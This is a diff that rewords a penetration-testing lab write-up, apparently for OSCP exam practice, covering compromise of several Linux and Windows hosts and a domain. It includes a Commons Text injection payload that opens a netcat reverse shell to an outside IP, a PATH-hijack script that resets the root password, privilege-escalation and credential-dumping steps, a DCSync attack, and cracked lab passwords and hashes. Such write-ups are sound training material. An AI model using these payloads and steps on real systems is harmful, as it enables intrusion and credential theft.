@@ -5,9 +5,9 @@
 **Given:**
 
 - 192.168.145.147 MS01
-- 192.168.145.149 
-- 192.168.145.150 
-- 192.168.145.151 
+- 192.168.145.149
+- 192.168.145.150
+- 192.168.145.151
 
 **Found:**
 
@@ -23,7 +23,6 @@ sql_svc:Dolphin1
 Administrator:December31 (local admin on MS01)
 
 other users:
-
 ```
 
 ## Network Enumeration
@@ -36,17 +35,17 @@ other users:
 
 ![](assets/Pasted%20image%2020250216235211.png)
 
-Doing an udp scan we have snmp
+Performing a UDP scan reveals SNMP.
 
 ![](assets/Pasted%20image%2020250217011643.png)
 
 ### Initial Access
 
-Scanning it with snmpwalk extended
+Scanning it with `snmpwalk` extended.
 
 ![](assets/Pasted%20image%2020250217011708.png)
 
-So we have user kiero with a default password, we'll use hydra using -e nsr to try same pass as user, null or reversed.
+We discover the user `kiero` with a default password. We'll use Hydra with the `-e nsr` option to try the same password as the username, null, or reversed.
 
 ```bash
 hydra ftp://192.168.188.149 -l kiero -P /usr/share/wordlists/rockyou.txt.gz -e nsr
@@ -56,41 +55,41 @@ hydra ftp://192.168.188.149 -l kiero -P /usr/share/wordlists/rockyou.txt.gz -e n
 
 And we get `kiero:kiero`.
 
-Trying the ftp
+Testing FTP access:
 
 ![](assets/Pasted%20image%2020250217012252.png)
 
-download the keys and inspect them
+Download the keys and inspect them.
 
 ![](assets/Pasted%20image%2020250217013340.png)
 
-the public one has the user john so we'll try ssh
+The public key mentions the user `john`, so we'll try SSH.
 
 ![](assets/Pasted%20image%2020250217013444.png)
 
 ### Privilege Escalation
 
-Get the local flag
+Get the local flag.
 
 ![](assets/Pasted%20image%2020250217013539.png)
 
 ![](assets/Pasted%20image%2020250217121252.png)
 
-RESET_PASSWD has the sudo bit, download the program and strings it.
+`RESET_PASSWD` has the SUID bit set. Download the program and analyze it with `strings`.
 
-We can see that calls chpasswd without absolute path.
+We observe that it calls `chpasswd` without an absolute path.
 
 ![](assets/Pasted%20image%2020250217121404.png)
 
-So we can hijack the path and create a malicious program with the same name in /tmp and add /tmp to our path.
+This allows us to hijack the PATH and create a malicious program with the same name in `/tmp`. Add `/tmp` to the PATH.
 
-We make a simple script in `/tmp/chpasswd` and chmod +x
+Create a simple script in `/tmp/chpasswd` and make it executable:
 
 ```bash
 echo 'echo "root:kiero" | /usr/sbin/chpasswd'
 ```
 
-Now prepend /tmp to john's path and execute RESET_PASSWD
+Prepend `/tmp` to John's PATH and execute `RESET_PASSWD`:
 
 ```bash
 export PATH=/tmp:$PATH
@@ -108,11 +107,11 @@ export PATH=/tmp:$PATH
 
 ![](assets/Pasted%20image%2020250217220330.png)
 
-Webpage on 8080 shows us that there is an api that is up
+A webpage on port 8080 shows that there is an API running.
 
 ![](assets/Pasted%20image%2020250217220452.png)
 
-Using feroxbuster we find /search and /CHANGELOG
+Using `feroxbuster`, we find `/search` and `/CHANGELOG`.
 
 ![](assets/Pasted%20image%2020250218132246.png)
 
@@ -120,11 +119,11 @@ Using feroxbuster we find /search and /CHANGELOG
 
 ![](assets/Pasted%20image%2020250218132311.png)
 
-Searching for vulns for Apache Commons Text 1.8 we find Text4Logs
+Searching for vulnerabilities in Apache Commons Text 1.8, we find Text4Logs.
 
 https://github.com/sunnyvale-it/CVE-2022-42889-PoC
 
-So executing `${script:javascript:java.lang.Runtime.getRuntime().exec('busybox nc 192.168.45.229 443 -e sh')}` in the search function we can get a shell. (URL econde with cyberchef)
+Executing `${script:javascript:java.lang.Runtime.getRuntime().exec('busybox nc 192.168.45.229 443 -e sh')}` in the search function gives us a shell. (URL encoded with CyberChef)
 
 ![](assets/Pasted%20image%2020250218132521.png)
 
@@ -136,31 +135,31 @@ Get the flag
 
 ![](assets/Pasted%20image%2020250218132813.png)
 
-In /opt we can see the project, and a App.java file, this app opens a socket on 5000.
+In `/opt`, we find the project and an `App.java` file. This app opens a socket on port 5000.
 
 ![](assets/Pasted%20image%2020250219102300.png)
 
-Using ss we see an internal port 8000
+Using `ss`, we see an internal port 8000.
 
 ![](assets/Pasted%20image%2020250219110044.png)
 
-And using ps aux we can see that that port is for java debuging
+Using `ps aux`, we observe that the port is for Java debugging.
 
 ![](assets/Pasted%20image%2020250219110452.png)
 
-Transfer chisel and make a tunnel and access that port.
+Transfer `chisel` and create a tunnel to access the port.
 
 ![](assets/Pasted%20image%2020250219110302.png)
 
-We can use jdwp-shellifier https://github.com/IOActive/jdwp-shellifier
+We use `jdwp-shellifier` https://github.com/IOActive/jdwp-shellifier.
 
 ![](assets/Pasted%20image%2020250219113803.png)
 
-In the command, we put the suid bit to make /bin/bash executable by root, while the debugger is waiting for the program to execute, we nc to port 5000 to reach the breakpoint.
+In the command, we set the SUID bit to make `/bin/bash` executable by root. While the debugger waits for the program to execute, we use `nc` to port 5000 to reach the breakpoint.
 
 ![](assets/Pasted%20image%2020250219113915.png)
 
-Then if we check with dev user
+Then, we check with the `dev` user.
 
 ![](assets/Pasted%20image%2020250219114007.png)
 
@@ -176,17 +175,17 @@ Then if we check with dev user
 
 ### Initial Access
 
-http server has nothing, let's search for a exploit for 8021, freeswitch-event
+The HTTP server has nothing. Let's search for an exploit for port 8021, `freeswitch-event`.
 
 ![](assets/Pasted%20image%2020250219125219.png)
 
 ![](assets/Pasted%20image%2020250219125235.png)
 
-We can put a powershell reverse shell 
+We can use a PowerShell reverse shell.
 
 ![](assets/Pasted%20image%2020250219125500.png)
 
-And we  got a shell
+And we get a shell.
 
 ![](assets/Pasted%20image%2020250219125519.png)
 
@@ -196,18 +195,17 @@ Get the local flag
 
 ![](assets/Pasted%20image%2020250219125604.png)
 
-Chris has seimpersonate
+Chris has `SeImpersonatePrivilege`.
 
 ![](assets/Pasted%20image%2020250219125713.png)
 
-Transfer juicypotatong to the machine, make a reverse shell with msfvenom and listen at 8888.
+Transfer `juicypotato-ng` to the machine, create a reverse shell with `msfvenom`, and listen on port 8888.
 
 ![](assets/Pasted%20image%2020250219133859.png)
 
 ### Post Exploitation
 
 ![](assets/Pasted%20image%2020250219133956.png)
-
 
 ## 192.168.145.147
 
@@ -217,11 +215,11 @@ Transfer juicypotatong to the machine, make a reverse shell with msfvenom and li
 
 ### Initial Access
 
-Use the provided credentials to SSH to the machine.
+Use the provided credentials to SSH into the machine.
 
 ### Privilege Escalation
 
-Transfer adPEAS and 
+Transfer `adPEAS`.
 
 ![](assets/Pasted%20image%2020250219235957.png)
 
@@ -229,7 +227,7 @@ Transfer adPEAS and
 
 ![](assets/Pasted%20image%2020250220000542.png)
 
-Transfer chisel and make a tunnel and get kerberoastable users hashes
+Transfer `chisel`, create a tunnel, and retrieve Kerberoastable user hashes.
 
 ![](assets/Pasted%20image%2020250220001918.png)
 
@@ -239,29 +237,29 @@ hashcat -m 13100 hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
 
 ![](assets/Pasted%20image%2020250220002053.png)
 
-We get `web_svc:Diamond1` and `sql_svc:Dolphin1`
+We get `web_svc:Diamond1` and `sql_svc:Dolphin1`.
 
-User eric has seimpersonate so we transfer printer spoofer and
+User `eric` has `SeImpersonatePrivilege`, so we transfer `printerspoofer`.
 
 ![](assets/Pasted%20image%2020250220174238.png)
 
 ### Post Exploitation
 
-Transfer mimikatz to the host.
+Transfer `mimikatz` to the host.
 
 `sekurlsa::logonpassword`
 
 ![](assets/Pasted%20image%2020250220181430.png)
 
-Using hashcat
+Using `hashcat`.
 
 ![](assets/Pasted%20image%2020250220181515.png)
 
-Start a ssh tunnel to be able to scan and work in the internal network
+Start an SSH tunnel to scan and work in the internal network.
 
 ![](assets/Pasted%20image%2020250220212017.png)
 
-Doing a ping sweep we have the third machine.
+Performing a ping sweep reveals the third machine.
 
 ![](assets/Pasted%20image%2020250220004507.png)
 
@@ -273,7 +271,7 @@ Doing a ping sweep we have the third machine.
 
 ### Initial Access
 
-Using `sql_svc:Dolphin1` we can connect to mssql on ms02
+Using `sql_svc:Dolphin1`, we connect to MSSQL on MS02.
 
 `proxychains -q impacket-mssqlclient 'oscp.exam/sql_svc:Dolphin1@10.10.105.148' -windows-auth`
 
@@ -285,29 +283,28 @@ Using `sql_svc:Dolphin1` we can connect to mssql on ms02
 
 ![](assets/Pasted%20image%2020250220220337.png)
 
-In the pivot, we can transfer nc.exe and start a listener and within msql start a powershell rverse shell
+In the pivot, transfer `nc.exe`, start a listener, and initiate a PowerShell reverse shell within MSSQL.
 
 ![](assets/Pasted%20image%2020250220223306.png)
 
 ![](assets/Pasted%20image%2020250220223353.png)
 
-Now we notice windows.old, so we can get SAM and SYSTEM.
+We notice `windows.old`, so we retrieve `SAM` and `SYSTEM`.
 
-Transfer them to the pivot via smb share
+Transfer them to the pivot via SMB share.
 
 ```bash
 mkdir tests
 New-SmbShare -Name "tests" -Path "C:\tests" -FullAccess "Everyone"
 ```
 
-
 ![](assets/Pasted%20image%2020250220224532.png)
 
-Now create a smbshare on kali and copy them again
+Create an SMB share on Kali and copy them again.
 
 ![](assets/Pasted%20image%2020250220224613.png)
 
-Now using secretsdump we get the hashes for MS02
+Using `secretsdump`, we retrieve the hashes for MS02.
 
 ![](assets/Pasted%20image%2020250220224641.png)
 
@@ -330,17 +327,17 @@ Mark.Chetty:1004:aad3b435b51404eeaad3b435b51404ee:92903f280e5c5f3cab018bd91b94c7
 
 ### Initial Access
 
-Using the hash from `tom_admin` obtained in MS02 we can evil-winrm inside.
+Using the hash from `tom_admin` obtained in MS02, we use `evil-winrm` to access.
 
 ![](assets/Pasted%20image%2020250220225219.png)
 
 ### Privilege Escalation
 
-As tom_admin is privileged we can make a DCsync attack and get all the hashes
+As `tom_admin` is privileged, we perform a DCsync attack to retrieve all the hashes.
 
 ![](assets/Pasted%20image%2020250220230713.png)
 
-Use the admin hash to winrm
+Use the admin hash to access via `winrm`.
 
 ![](assets/Pasted%20image%2020250220230931.png)
 
